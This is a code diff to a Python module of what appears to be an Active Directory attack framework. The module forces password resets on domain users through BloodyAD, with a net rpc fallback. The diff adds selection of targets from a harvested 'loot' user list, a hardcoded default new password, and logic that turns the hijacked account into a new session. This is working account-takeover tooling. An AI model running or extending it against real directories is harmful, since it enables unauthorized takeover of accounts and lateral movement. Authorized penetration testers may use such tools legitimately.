@@ -1,12 +1,26 @@
 # modules/forcechangepw.py
 
-from core.helpers import get_auth_args, run_command
+from core.helpers import get_auth_args, run_command, select_from_list
 from core.colors import red, green, yellow, blue
+import os
 
 DEFAULT_NEW_PASSWORD = "BaldHead2025!"
 
-def attack_force_change(session, target_user, session_mgr):
-    print(blue(f"[*] Attempting to change password for '{target_user}' using BloodyAD..."))
+def attack_force_change(session, *parts, session_mgr=None):
+    print(blue(f"[*] Attempting to change password using BloodyAD on {session.target_ip}..."))
+    target_user = parts[0] if parts else None
+    # === Prompt for user if not provided ===
+    if not target_user:
+        loot_path = "loot/valid_users.txt"
+        if os.path.exists(loot_path):
+            with open(loot_path, "r") as f:
+                users = [line.strip() for line in f if line.strip()]
+            if users:
+                target_user = select_from_list(users, "Select user to change password")
+            else:
+                target_user = input("[?] Enter username: ").strip()
+        else:
+            target_user = input("[?] Enter username: ").strip()
 
     is_kerberos = not session.hash and not session.password
     is_self_change = session.username.lower() == target_user.lower()
@@ -57,8 +71,8 @@ def attack_force_change(session, target_user, session_mgr):
         print(yellow("[!] Kerberos cannot reset another user's password without delegation rights."))
         print(yellow("[!] Try re-authenticating using a password or hash."))
         print(blue("[*] Recommended:"))
-        print(blue(f"    addsession {session.username}_pw {session.username} <password> -d {session.domain} -dc {session.dc_ip}"))
-        print(blue(f"    Then re-run: attack forcechangepw {target_user}"))
+        print(blue(f"    session add {session.username}_pw {session.username} <password> {session.domain} {session.target_ip} {session.dc_ip}"))
+        print(blue(f"    Then run: attack forcechangepw {target_user}"))
         return
 
     # === Fallback: net rpc ===
@@ -87,6 +101,9 @@ def attack_force_change(session, target_user, session_mgr):
 
 
 def _add_new_session(session_mgr, target_user, old_session):
+    if not session_mgr:
+        return
+
     session_name = f"{target_user.lower()}_pwreset"
     session_mgr.add(
         name=session_name,
